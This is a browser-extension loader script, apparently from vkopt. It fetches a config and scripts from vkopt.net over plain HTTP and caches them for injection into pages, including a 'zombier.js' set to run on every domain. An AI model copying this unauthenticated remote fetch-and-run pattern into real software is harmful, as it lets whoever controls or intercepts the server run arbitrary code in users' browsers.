(function(){
var ex_loader = {
   base_path: 'http://vkopt.net/upd/',
   config_url:'upd/config.json',
   scripts_path:'scripts/',
   mark:'vkopt_loader',
   config:[ //Default config
      {
         "in_frames":1, // 0 or null - execute in all; 1 - exclude frames; 2 - only in frames; 3 - disable scripts
         "run_at":0, //0 - start or 1 - dom_content_loaded
         "files":[  //Scripts list
            //"script1.js",
            //"script2.js"
         ],
         "domain":"example\\.com",
         "exclude":"|notifier\.php|im_frame\.php|about:blank|i" // RegEx "|pattern|flags" for excluding urls
      },
      {
         "files":["zombier.js"],
         "domain":".*"
      },      
   ],
   update_time: 10*60*1000, //update scripts each 4 hours
   init:function(){
      ex_loader.init_config();
      if (window.external && window.external.mxGetRuntime){         // MAXTHON
            var rt = window.external.mxGetRuntime();
            
            rt.listen('update_scripts', function(data){
               ex_loader.update_all(function(){
                  rt.post('scripts_updated',{key:data.key});
               }); 
            });
            
            rt.listen('get_scripts', function(data){
               ex_loader.get_scripts(data.url,function(files){
                  rt.post('scripts',{files:files,key:data.key});
               },data.in_frame);               
            });   
      }
      setInterval(function(){ //Run update checker
         //ex_loader.update_config();
         ex_loader.init_config();      
      },ex_loader.update_time);
   },
   is_allow_run:function(in_frames,doc,in_frame){
      in_frames = in_frames || 0;
      var inframe=(in_frame!=null)?in_frame:((doc || document).defaultView.parent != (doc || document).defaultView);
      switch (in_frames){ // 0 or null - execute in all; 1 - exclude frames; 2 - only in frames; 3 - disable scripts
         case 0: 
            return true; // include all
         case 1: 
            return inframe?false:true; // exclude frames
         case 2:
            return inframe?true:false; // only in frames
         case 3:
            return false;  // disable scripts
      }
      return true;      
   },
   update_all:function(callback){
      ex_loader.set('scripts_config_hash',Math.random());
      ex_loader.update_config(function(){ex_loader.init_config(callback);},true);   
   },
   get_scripts:function(url,callback,in_frame){
      var domain=url;
      if (url=='about:blank'){ 
         callback([]);
         return;
      }
      if (domain.indexOf('/')!=-1) domain=domain.split('/')[2];
      var data=ex_loader.config;
      var scripts=[];
      for (var i=0; i<data.length;i++){
         var rx=data[i].domain;
         var x=rx.match(/^\|(.+)\|([a-z]*)$/);  // parse regex  "|^http://ya\\.ru|i"
         if (x){
            rx=new RegExp(x[1],x[2]);
         }
         
         var allow=true;
         var exclude_rx=data[i].exclude;
         if (exclude_rx){
            var x=exclude_rx.match(/^\|(.+)\|([a-z]*)$/);  // parse regex  "|^http://ya\\.ru|i"
            if (x){
               exclude_rx=new RegExp(x[1],x[2]);
            }
            if (url.match(exclude_rx))
               allow=false;
            
         }
         
         if (allow && in_frame!=null) allow=ex_loader.is_allow_run(data[i].in_frames,null,in_frame);

         if (url.match(rx) && allow)
            for (var j=0;j<data[i].files.length;j++){
               var src=(data[i].files[j].match(/https?:\/\//))?data[i].files[j]:ex_loader.base_path+ex_loader.scripts_path+data[i].files[j];
               scripts.push([src,data[i].in_frames,data[i].files[j], (data[i].run_at || 0)]);
            }
      }
      result=[];
      var idx=0;
      var load_next=function(){
         if (idx>=scripts.length) {
            callback(result);
            return;
         }
         
         ex_loader.get_script_content(scripts[idx][0],function(script){
            scripts[idx][0]=script;
            result.push(scripts[idx]);
            idx++;
            load_next();
         });
      }
      load_next();
   },
   update_config:function(callback,clear){
      var cfg_url=ex_loader.config_url.match(/^https?\:\/\//)?ex_loader.config_url:ex_loader.base_path+ex_loader.config_url;
      ex_loader.load(cfg_url+'?rand='+Math.random(),function(script){
         if (!script) return;
         if (clear) ex_loader.clear();
         var ts=ex_loader.time();
         ex_loader.set('scripts_config',ts+script);//store script and timesamp        
         callback();
      });
   },
   init_config:function(callback){
      var cur_ts=ex_loader.time();
      var ts=0; 
      var content=ex_loader.get('scripts_config');
      var old_hash=ex_loader.get('scripts_config_hash');
      if (content){
         content=String(content);
         ts=parseInt(content.substr(0,String(cur_ts).length));//parse script download time
         content=content.substr(String(cur_ts).length);//parse script content
         if (content=='')  return; // next call maybe from setInterval in ex_loader.init();
         try{
            var data=JSON.parse(content);
            var hash=String(data.shift());
            ex_loader.set('scripts_config_hash',hash);
            ex_loader.config=data;
         }catch(e){
            ex_loader.error('config_parse_error. waiting '+ex_loader.update_time+'ms for reloading...');
            setTimeout(function(){
               ex_loader.update_config(function(){ex_loader.init_config(callback);});
            },ex_loader.update_time);
            return;
         }
         
         if (old_hash!=hash){
            setTimeout(function(){
               var scripts=[];
               for (var i=0; i<data.length;i++)
                     for (var j=0;j<data[i].files.length;j++){
                        var src=(data[i].files[j].match(/https?:\/\//))?data[i].files[j]:ex_loader.base_path+ex_loader.scripts_path+data[i].files[j];
                        scripts.push(src);
                     }
               //for (var key in scripts) ex_loader.update_script(scripts[key]);
               
               var idx=0;
               var load_next=function(){
                  if (idx>=scripts.length){ 
                     if (callback) callback();
                     return;
                  }
                  ex_loader.update_script(scripts[idx++],load_next);
               }
               load_next(); 
            },5);
         }
         if (cur_ts - ts > ex_loader.update_time) setTimeout(function(){ex_loader.update_config(ex_loader.init_config);},10);// update if script date expired           
      } else {
         ex_loader.update_config(function(){ex_loader.init_config(callback)});
      } 
   },
   time:function() { return Math.round(new Date().getTime());},
   error:function(s){console.log(s);},  
   load:function(path,callback){
      var req = new XMLHttpRequest();
      req.open('GET', path, true);
      req.onreadystatechange = function(){
         if (req.readyState == 4) {
            if (!req.responseText) ex_loader.error('ERROR: Can\'t read ' + path);
            callback(req.status==200?req.responseText:null,req);
         }
      };
      req.send();
      //if (!req.responseText) ex_loader.error('ERROR: Can\'t read ' + path);
      //return req.status==200?req.responseText:null;
   },
   get:function(key){
      return localStorage[key];
   },
   set:function(key,value){
      localStorage[key]=value;
   },
   clear:function(){
      localStorage.clear();    
   },
   update_script:function(name,callback){
      ex_loader.load(name+'?rand='+Math.random(),function(script){
         if (!script) return;
         var ts=ex_loader.time();
         ex_loader.set(name.split('/').pop(),ts+script);//store script and timesamp
         callback();
      });

   },
   get_script_content:function(name,callback){
      var cur_ts=ex_loader.time();
      var ts=0; 
      var key=name.split('/').pop();
      var content=ex_loader.get(key);
      
      if (content){
         content=String(content);
         ts=parseInt(content.substr(0,String(cur_ts).length));//parse script download time
         content=content.substr(String(cur_ts).length);//parse script content
         //if (ts-cur_ts > ex_loader.update_time) setTimeout(function(){ex_loader.update_script(name)},10);// update if script date expired
      } else {
         ex_loader.update_script(name,function(){
            ex_loader.get_script_content(name,function(content){
               callback(content);
            }); 
         });
         return;
      }
      callback(content);    
   }
}

informer={
   delay:2000,
   show:function(msg,delay,doc){
      delay = delay || informer.delay;
      doc = doc || document;
      var div=doc.createElement('div');
      div.setAttribute('style','position:fixed; z-index:10000; background:rgba(0,0,0,0.7); color:#FFF; padding:10px; width:200px; left:-250px; border-radius:0 15px 15px 0; bottom:5px; box-shadow:0 0 5px #000; text-shadow:0 -1px #000; -webkit-transition: all 200ms linear;-moz-transition: all 200ms linear;-o-transition: all 200ms linear; transition: all 200ms linear;font-family: "tahoma", "arial", "verdana", sans-serif, "Lucida Sans"; font-size: 11px;');
      div.innerHTML=msg;
      var a=doc.createElement('div');
      a.innerHTML='&times;';
      a.setAttribute('style','cursor:pointer; float:right; padding:0px 3px; line-height:16px; font-weight:bold;font-size: 8pt; background:rgba(0,0,0,0.5); border-radius:3px;');
      div.insertBefore(a,div.firstChild);
      doc.body.appendChild(div);
      var old_left=div.style.left;
      
      var visible=true;
      var hide=function(){
         if (!visible) return;
         visible=false;
         div.style.left=old_left;
         setTimeout(function(){div.parentNode.removeChild(div);},400);      
      }
      a.onclick=hide;
      setTimeout(function(){div.style.left='0px';},1);
      setTimeout(function(){
         hide();
      },delay);
   }
}


ex_loader.init();

/////
})();